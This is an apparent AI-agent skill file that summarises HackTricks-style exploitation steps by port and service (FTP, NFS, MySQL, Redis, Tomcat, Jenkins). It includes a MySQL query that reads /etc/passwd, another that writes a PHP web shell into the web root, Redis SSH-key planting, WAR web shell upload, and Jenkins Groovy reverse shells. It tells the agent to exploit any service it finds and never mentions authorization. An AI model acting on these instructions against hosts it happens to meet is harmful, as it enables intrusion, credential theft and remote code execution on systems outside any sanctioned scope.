---
name: bbp-hacktricks
description: Encyclopedia of penetration testing and privilege escalation from carlospolop/hacktricks. Use this skill when you encounter specific open ports (e.g., 6379, 27017, 8080) or specific services (Jenkins, Tomcat, Redis) and need exact exploitation methodologies.
---

# HackTricks Methodology

When you encounter an open port or specific service during reconnaissance, use this guide to determine the next exploitation steps.

## Common Ports & Exploitation

### Port 21 (FTP)
- Check for Anonymous login: `ftp <IP>` (user: anonymous, pass: anonymous)
- Check vsftpd versions for backdoor (e.g., vsftpd 2.3.4).
- Look for configuration files or backups.

### Port 22 (SSH)
- Rarely exploitable directly unless weak credentials or old OpenSSH version.
- Search for leaked private keys (`id_rsa`) on GitHub.

### Port 111 / 2049 (NFS)
- Check exported shares: `showmount -e <IP>`
- Mount locally: `mount -t nfs <IP>:/share /mnt/nfs`
- Look for credentials or misconfigured permissions.

### Port 3306 (MySQL)
- Try default credentials: `root:`, `root:root`, `admin:admin`.
- If credentials found, check for file read/write: `SELECT LOAD_FILE('/etc/passwd');` or `SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php';`

### Port 6379 (Redis)
- Try to connect without password: `redis-cli -h <IP>`
- If no auth required, achieve RCE by writing SSH key to `/root/.ssh/authorized_keys`.

### Port 8080 / 8081 (Tomcat, Jenkins)
- **Tomcat**: Try `manager/html` with default credentials (`tomcat:tomcat`). Upload a WAR file containing a webshell.
- **Jenkins**: Try `admin:admin`. If you have access, go to `/script` and execute a Groovy reverse shell.

## General Strategy
1. Search for known CVEs for the exact version identified.
2. Test for default credentials.
3. Exploit misconfigurations to read files or gain RCE.
